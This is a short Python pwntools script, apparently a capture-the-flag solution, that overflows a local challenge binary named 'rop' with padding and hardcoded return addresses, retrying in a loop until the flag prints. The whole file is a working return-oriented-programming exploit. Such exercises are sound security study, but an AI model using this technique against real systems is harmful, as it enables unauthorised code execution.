#! /usr/bin/env python2

from pwn import *

payload = ('A'*28) + p32(0xf7df9960) + p32(0x80486b3) + p32(0x0804a03d)

while True:
    try:
        p = process("./rop")
        p.recvuntil('> ')
        p.sendline(payload)
        p.sendline('\x01\x01\x01\x00')
        print("Flag: " + p.recvuntil('}'))
        break
    except:
        p.close()
